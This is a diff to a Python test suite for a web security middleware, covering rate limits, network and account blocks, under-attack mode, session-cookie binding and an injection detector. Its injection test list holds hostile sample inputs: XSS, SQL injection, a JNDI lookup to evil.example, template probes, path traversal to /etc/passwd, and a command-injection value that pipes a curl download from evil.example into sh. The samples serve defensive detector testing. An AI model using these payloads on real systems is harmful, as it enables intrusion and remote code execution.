@@ -268,10 +268,264 @@ def test_probe_detector_leaves_real_paths_alone():
         assert security_shield.is_probe_path(path), path
 
 
+# ------------------------------------------------------------------- admins
+
+
+def test_admins_are_limited_per_account_at_the_admin_factor():
+    alerts: list[dict] = []
+    shield = _shield(alerts=alerts)  # 10 requests a minute, admins 5x
+    actions = [shield.check("203.0.113.5", path="/director", account="42").action for _ in range(50)]
+    assert actions == ["allow"] * 50
+    assert shield.check("203.0.113.5", path="/director", account="42").action == "throttle"
+    # Anonymous traffic from the same address has its own, normal budget.
+    assert shield.check("203.0.113.5", path="/").action == "allow"
+
+    actions = [shield.check("203.0.113.5", path="/director", account="42").action for _ in range(50)]
+    assert actions[-1] == "block"
+    assert alerts[-1]["kind"] == "blocked"
+    assert "admin account 42 (from 203.0.113.5)" in alerts[-1]["summary"]
+    # The owner is not special: a blocked account stays blocked from any address.
+    assert shield.check("198.51.100.7", path="/director", account="42").action == "block"
+    assert shield.check("198.51.100.7", path="/director", account="7").action == "allow"
+    assert shield.unblock_ip("admin:42") is True
+    assert shield.check("198.51.100.7", path="/director", account="42").action == "allow"
+
+
+def test_admin_writes_404s_and_failed_logins_use_the_factor_too():
+    shield = _shield()
+    actions = [shield.check("203.0.113.5", method="POST", path="/api/x", account="42").action for _ in range(21)]
+    assert actions == ["allow"] * 20 + ["throttle"]
+
+    for _ in range(29):
+        shield.note_response("203.0.113.6", 404, account="43")
+    assert shield.check("203.0.113.6", path="/", account="43").action == "allow"
+    shield.note_response("203.0.113.6", 404, account="43")
+    assert shield.check("203.0.113.6", path="/", account="43").action == "block"
+
+    for _ in range(25):
+        shield.note_response("203.0.113.7", 401, had_credentials=True, account="44")
+    assert shield.check("203.0.113.7", path="/", account="44").action == "block"
+
+
+def test_an_ip_block_does_not_lock_out_an_admin_on_that_network():
+    shield = _shield()
+    for _ in range(3):
+        shield.check("203.0.113.5", path="/.env")
+    assert shield.check("203.0.113.5", path="/").action == "block"
+    assert shield.check("203.0.113.5", path="/director", account="42").action == "allow"
+
+
+# ------------------------------------------------------ rotating addresses
+
+
+def test_ipv6_addresses_in_one_64_share_a_budget():
+    shield = _shield()
+    for index in range(10):
+        assert shield.check(f"2001:db8:1:2::{index + 1:x}", path="/").action == "allow"
+    assert shield.check("2001:db8:1:2:ffff::1", path="/").action == "throttle"
+    assert shield.check("2001:db8:1:3::1", path="/").action == "allow"
+
+    for index in range(3):
+        shield.check(f"2001:db8:9:9::{index + 1}", path="/.env")
+    assert shield.active_blocks()[0]["ip"] == "2001:db8:9:9::/64"
+    assert shield.check("2001:db8:9:9::abcd", path="/").action == "block"
+
+
+def test_neighbouring_addresses_share_a_network_budget():
+    alerts: list[dict] = []
+    shield = _shield(alerts=alerts, network_factor=2.0)  # 20 requests a minute per /24
+    actions = [shield.check(f"203.0.113.{index + 1}", path="/").action for index in range(20)]
+    assert actions == ["allow"] * 20
+    assert shield.check("203.0.113.100", path="/").action == "throttle"
+    assert shield.check("198.51.100.1", path="/").action == "allow"
+
+    actions = [shield.check(f"203.0.113.{index + 101}", path="/").action for index in range(20)]
+    assert actions[-1] == "block"
+    assert "network 203.0.113.0/24" in alerts[-1]["summary"]
+    assert shield.check("203.0.113.250", path="/").action == "block"
+    assert shield.active_blocks()[0]["kind"] == "network"
+
+
+def test_surge_switches_on_under_attack_mode_which_tightens_anonymous_limits():
+    alerts: list[dict] = []
+    clock = FakeClock()
+    hosting = {"192.0.2.10"}
+    shield = SecurityShield(
+        dataclasses.replace(
+            ShieldSettings(), requests_per_minute=10, surge_requests_per_minute=100, network_factor=100.0
+        ),
+        resolver=ClientIpResolver(),
+        on_alert=alerts.append,
+        clock=clock,
+        network_classifier=lambda ip: "datacenter" if ip in hosting else None,
+    )
+    for index in range(100):
+        shield.check(f"198.51.{index}.1", path="/")
+    assert shield.under_attack()
+    assert "Under-attack mode is on" in next(a for a in alerts if a["kind"] == "surge")["summary"]
+
+    clock.advance(120)  # past the surge minute
+    assert [shield.check("203.0.113.5", path="/").action for _ in range(6)] == ["allow"] * 5 + ["throttle"]
+    assert [shield.check("192.0.2.10", path="/").action for _ in range(3)] == ["allow"] * 2 + ["throttle"]
+    actions = [shield.check("203.0.113.9", path="/", account="42").action for _ in range(50)]
+    assert set(actions) == {"allow"}
+
+    clock.advance(shield.settings.under_attack_seconds)
+    assert not shield.under_attack()
+    assert [shield.check("203.0.113.77", path="/").action for _ in range(10)] == ["allow"] * 10
+
+
+def test_directors_can_switch_under_attack_mode_and_it_survives_a_restart():
+    store = MemoryStore()
+    clock = FakeClock()
+    shield = _shield(clock=clock, store=store)
+    _real_ensure_loaded(shield)
+    shield.set_under_attack(3600, actor="Director")
+    _real_flush(shield)
+    assert store.saves[-1]["under_attack_until"] == clock.now + 3600
+
+    restarted = _shield(clock=clock, store=store)
+    _real_ensure_loaded(restarted)
+    assert restarted.stats()["under_attack"] is True
+    assert restarted.stats()["under_attack_reason"] == "raised by Director"
+    assert restarted.clear_under_attack(actor="Director") is True
+    assert restarted.under_attack() is False
+    assert restarted.clear_under_attack() is False
+
+
+# --------------------------------------------------------------- injection
+
+
+_INJECTIONS = (
+    ("/search", "q=<script>alert(1)</script>"),
+    ("/search", "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
+    ("/search", "q=%253Csvg%2520onload%253Dalert(1)%253E"),  # encoded twice
+    ("/search", 'q="><img src=x onerror=alert(1)>'),
+    ("/go", "next=javascript:alert(document.cookie)"),
+    ("/archive", "id=1 UNION ALL SELECT username,password FROM users"),
+    ("/archive", "id=1' OR '1'='1"),
+    ("/archive", "id=1;SELECT pg_sleep(5)"),
+    ("/archive", "q=x' and 1=1--"),
+    ("/api", "x=${jndi:ldap://evil.example/a}"),
+    ("/page", "name={{7*7}}"),
+    ("/page", "name={{config.items()}}"),
+    ("/ping", "host=127.0.0.1;curl http://evil.example/x|sh"),
+    ("/file", "path=../../etc/passwd"),
+    ("/file", "path=php://filter/resource=index"),
+    ("/<script>alert(1)</script>", ""),
+)
+
+_LEGITIMATE = (
+    ("/", ""),
+    ("/dashboard", "guild=1234567890"),
+    ("/login", "next=/director/files?key=archive/omega/report.json"),
+    ("/auth/callback", "code=Xy9_aB-12&state=k3J9mQ"),
+    ("/archive/search", "q=operation union station"),
+    ("/archive/search", "q=Fish and chips = good"),
+    ("/archive/search", "q=O'Brien and Smith"),
+    ("/api/support/stream", "token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.c2ln"),
+    ("/zeta", "onboarding=1&select=all"),
+    ("/wasp", "track=Night+Ops+%E2%80%94+Remix&t=1:30"),
+    ("/director/files/content", "key=dossiers/a b/c.json"),
+    ("/fleet", "sort=-updated&filter=class:frigate"),
+)
+
+
+def test_injection_detector():
+    for path, query in _INJECTIONS:
+        assert security_shield.looks_like_injection(path, query), (path, query)
+    for path, query in _LEGITIMATE:
+        assert not security_shield.looks_like_injection(path, query), (path, query)
+
+
+def test_injection_attempts_are_refused_then_blocked():
+    alerts: list[dict] = []
+    shield = _shield(alerts=alerts)
+    assert shield.check("203.0.113.5", path="/search", query="q=<script>x</script>").action == "probe"
+    assert shield.check("203.0.113.5", path="/archive", query="id=1 union select 1").action == "probe"
+    assert shield.check("203.0.113.5", path="/page", query="n={{7*7}}").action == "block"
+    assert "injection payloads" in alerts[-1]["summary"]
+    assert "{{7*7}}" in alerts[-1]["summary"]
+
+
+# ------------------------------------------------------------- concurrency
+
+
+def test_requests_in_progress_are_capped_per_client_and_site_wide():
+    alerts: list[dict] = []
+    shield = _shield(alerts=alerts, max_pending_per_client=2, max_pending=4)
+    assert shield.acquire("203.0.113.5").action == "allow"
+    assert shield.acquire("203.0.113.5").action == "allow"
+    assert shield.acquire("203.0.113.5").action == "throttle"
+    shield.release("203.0.113.5")
+    assert shield.acquire("203.0.113.5").action == "allow"
+
+    assert shield.acquire("198.51.100.1").action == "allow"
+    assert shield.acquire("198.51.100.2").action == "allow"
+    assert shield.stats()["in_progress"] == 4
+    assert shield.acquire("198.51.100.3").action == "overload"
+    assert alerts[-1]["kind"] == "overload"
+    assert shield.under_attack()
+    # Admins can still get in to deal with it, up to their own (larger) cap.
+    assert [shield.acquire("198.51.100.9", account="42").action for _ in range(10)] == ["allow"] * 10
+    assert shield.acquire("198.51.100.9", account="42").action == "throttle"
+
+    for ip in ("203.0.113.5", "203.0.113.5", "198.51.100.1", "198.51.100.2"):
+        shield.release(ip)
+    for _ in range(10):
+        shield.release("198.51.100.9", account="42")
+    shield.release("203.0.113.5")  # releasing more than was taken is harmless
+    assert shield.stats()["in_progress"] == 0
+    assert shield.acquire("198.51.100.3").action == "allow"
+
+
+# ---------------------------------------------------------- manual blocks
+
+
+def test_directors_can_block_whole_networks():
+    shield = _shield()
+    block = shield.block_ip("203.0.113.77/24", seconds=3600, reason="Botnet", actor="Director")
+    assert block.ip == "203.0.113.0/24"
+    assert block.kind == "network"
+    assert shield.check("203.0.113.200", path="/").action == "block"
+    assert shield.check("203.0.114.1", path="/").action == "allow"
+    assert shield.block_ip("198.51.100.5/32", seconds=60, reason="").ip == "198.51.100.5"
+    for too_wide in ("203.0.0.0/8", "2001:db8::/16"):
+        with pytest.raises(ValueError, match="too wide"):
+            shield.block_ip(too_wide, seconds=60, reason="")
+    with pytest.raises(ValueError, match="cannot be blocked"):
+        shield.block_ip("10.0.0.0/16", seconds=60, reason="")
+    assert shield.unblock_ip("203.0.113.0/24") is True
+    assert shield.check("203.0.113.200", path="/").action == "allow"
+    # Sizes other than the per-network budget's are matched by containment.
+    shield.block_ip("198.18.0.0/16", seconds=60, reason="")
+    shield.block_ip("2001:db8:aa::/48", seconds=60, reason="")
+    assert shield.check("198.18.77.1", path="/").action == "block"
+    assert shield.check("2001:db8:aa:1::5", path="/").action == "block"
+    assert shield.check("2001:db8:ab::5", path="/").action == "allow"
+
+
+def test_network_and_account_blocks_survive_a_restart():
+    store = MemoryStore()
+    clock = FakeClock()
+    shield = _shield(clock=clock, store=store)
+    _real_ensure_loaded(shield)
+    shield.block_ip("203.0.113.0/24", seconds=3600, reason="Botnet")
+    for _ in range(15):
+        shield.check("198.51.100.1", path="/.env", account="42")
+    _real_flush(shield)
+
+    restarted = _shield(clock=clock, store=store)
+    _real_ensure_loaded(restarted)
+    assert restarted.check("203.0.113.9", path="/").action == "block"
+    assert restarted.check("198.51.100.1", path="/", account="42").action == "block"
+    assert {row["kind"] for row in restarted.active_blocks()} == {"network", "account"}
+
+
 # --------------------------------------------------------------- middleware
 
 
-def _app(shield: SecurityShield, *, trusted=None, origins=()):
+def _app(shield: SecurityShield, *, admin=None, origins=()):
     async def page(request: Request):
         return PlainTextResponse("ok")
 
@@ -291,7 +545,7 @@ def _app(shield: SecurityShield, *, trusted=None, origins=()):
         ]
     )
     app.add_middleware(
-        ShieldMiddleware, shield=shield, trusted_session=trusted, trusted_origins=list(origins)
+        ShieldMiddleware, shield=shield, admin_identity=admin, trusted_origins=list(origins)
     )
     return app
 
@@ -331,11 +585,26 @@ def test_middleware_counts_failed_credentials():
     assert client.get("/").status_code == 403
 
 
-def test_trusted_sessions_are_never_limited():
+def test_admins_get_more_room_but_are_not_exempt():
     shield = _shield()
-    client = TestClient(_app(shield, trusted=lambda scope: True))
-    assert {client.get("/.env").status_code for _ in range(40)} == {404}
-    assert client.get("/").status_code == 200
+    client = TestClient(_app(shield, admin=lambda scope: "42"))
+    # Five times the probes an anonymous client gets, then the account is blocked.
+    assert {client.get("/.env").status_code for _ in range(14)} == {404}
+    assert client.get("/.env").status_code == 403
+    blocked = client.get("/", headers={"accept": "text/html"})
+    assert blocked.status_code == 403
+    assert "from your account" in blocked.text
+    assert shield.active_blocks()[0]["ip"] == "admin:42"
+    # The account was blocked, not the IP it came from.
+    assert TestClient(_app(shield)).get("/").status_code == 200
+
+
+def test_query_string_tokens_count_as_credentials():
+    shield = _shield()
+    client = TestClient(_app(shield))
+    for _ in range(5):
+        assert client.get("/denied?token=guess").status_code == 401
+    assert client.get("/").status_code == 403
 
 
 def test_body_size_limits():
@@ -370,3 +639,143 @@ def test_disabled_shield_passes_everything_through():
     shield = _shield(enabled=False)
     client = TestClient(_app(shield))
     assert {client.get("/").status_code for _ in range(50)} == {200}
+
+
+def _session_app(shield: SecurityShield, *, admin=None):
+    """An app with real signed sessions in front of the shield, as in config_app."""
+
+    from starlette.middleware.sessions import SessionMiddleware
+
+    async def sign_in(request: Request):
+        request.session["user"] = {"id": "42", "username": "ada"}
+        return PlainTextResponse("signed in")
+
+    async def me(request: Request):
+        user = request.session.get("user")
+        return JSONResponse({"user": user["id"] if user else None})
+
+    app = Starlette(routes=[Route("/sign-in", sign_in), Route("/me", me)])
+    app.add_middleware(ShieldMiddleware, shield=shield, admin_identity=admin)
+    app.add_middleware(SessionMiddleware, secret_key="test-secret")
+    return app
+
+
+_CHROME_130 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+_CHROME_131 = _CHROME_130.replace("Chrome/130.0.0.0", "Chrome/131.0.6778.86")
+_SCRIPT = "python-requests/2.32.3"
+
+
+def test_session_cookie_only_works_in_the_browser_it_was_first_used_in():
+    alerts: list[dict] = []
+    shield = _shield(alerts=alerts)
+    is_admin = lambda scope: (scope.get("session") or {}).get("user", {}).get("id")  # noqa: E731
+    owner = TestClient(_session_app(shield, admin=is_admin), headers={"user-agent": _CHROME_130})
+    owner.get("/sign-in")
+    assert owner.get("/me").json() == {"user": "42"}
+    # A browser update changes the version numbers, not the browser.
+    owner.headers["user-agent"] = _CHROME_131
+    assert owner.get("/me").json() == {"user": "42"}
+
+    thief = TestClient(_session_app(shield, admin=is_admin), headers={"user-agent": _SCRIPT})
+    thief.cookies.update(owner.cookies)
+    assert thief.get("/me").json() == {"user": None}
+    assert alerts[-1]["kind"] == "session-mismatch"
+    assert alerts[-1]["severity"] == "critical"
+    assert "admin ada (42)" in alerts[-1]["summary"]
+    # The copied cookie is dropped, so it does not work on the next try either.
+    assert thief.get("/me").json() == {"user": None}
+
+
+def test_member_session_mismatch_is_logged_without_paging_anyone():
+    alerts: list[dict] = []
+    shield = _shield(alerts=alerts)
+    member = TestClient(_session_app(shield), headers={"user-agent": _CHROME_130})
+    member.get("/sign-in")
+    thief = TestClient(_session_app(shield), headers={"user-agent": _SCRIPT})
+    thief.cookies.update(member.cookies)
+    assert thief.get("/me").json() == {"user": None}
+    assert alerts == []
+    assert shield.recent_events()[0]["kind"] == "session-mismatch"
+
+
+def test_websocket_handshakes_refused_with_a_token_count_as_failed_logins():
+    from starlette.routing import WebSocketRoute
+    from starlette.websockets import WebSocket
+
+    async def socket(websocket: WebSocket):
+        if websocket.query_params.get("token") != "right":
+            await websocket.close(code=1008)
+            return
+        await websocket.accept()
+        await websocket.send_text("hello")
+        await websocket.close()
+
+    shield = _shield()
+    app = Starlette(routes=[Route("/", lambda request: PlainTextResponse("ok")), WebSocketRoute("/ws", socket)])
+    app.add_middleware(ShieldMiddleware, shield=shield)
+    client = TestClient(app)
+    with client.websocket_connect("/ws?token=right") as ws:
+        assert ws.receive_text() == "hello"
+    from starlette.websockets import WebSocketDisconnect
+
+    for _ in range(5):
+        with pytest.raises(WebSocketDisconnect):
+            with client.websocket_connect("/ws?token=guess"):
+                pass
+    assert client.get("/").status_code == 403
+
+
+def test_streaming_responses_free_their_slot_once_they_start():
+    from starlette.responses import StreamingResponse
+
+    shield = _shield()
+    seen: list[int] = []
+
+    async def stream(request: Request):
+        async def body():
+            seen.append(shield.stats()["in_progress"])
+            yield b"data: 1\n\n"
+
+        return StreamingResponse(body(), media_type="text/event-stream")
+
+    async def page(request: Request):
+        seen.append(shield.stats()["in_progress"])
+        return PlainTextResponse("ok")
+
+    app = Starlette(routes=[Route("/stream", stream), Route("/", page)])
+    app.add_middleware(ShieldMiddleware, shield=shield)
+    client = TestClient(app)
+    assert client.get("/").status_code == 200
+    assert client.get("/stream").text == "data: 1\n\n"
+    assert seen == [1, 0]
+    assert shield.stats()["in_progress"] == 0
+
+
+def test_overloaded_server_sheds_anonymous_requests_but_serves_admins():
+    shield = _shield(max_pending=50)
+    for index in range(50):
+        shield.acquire(f"198.51.100.{index + 1}")
+    response = TestClient(_app(shield)).get("/", headers={"accept": "application/json"})
+    assert response.status_code == 503
+    assert response.headers["retry-after"] == "5"
+    assert TestClient(_app(shield, admin=lambda scope: "42")).get("/").status_code == 200
+
+
+def test_csp_nonce_is_fresh_per_response_and_empty_outside_one():
+    import contextvars
+
+    assert contextvars.Context().run(security_shield.csp_nonce) == ""
+    first = contextvars.Context().run(security_shield.new_csp_nonce)
+    second = contextvars.Context().run(security_shield.new_csp_nonce)
+    assert first != second and len(first) >= 24
+
+
+def test_injection_check_stays_fast_on_hostile_urls():
+    import time
+
+    hostile = ["< " * 8000, "<x " * 5000, "' or " * 3000, "{{ " * 5000, "${" * 8000]
+    started = time.perf_counter()
+    for text in hostile:
+        security_shield.looks_like_injection(text, text)
+    # A backtracking pattern takes seconds here; the bounded ones take milliseconds.
+    assert time.perf_counter() - started < 0.5
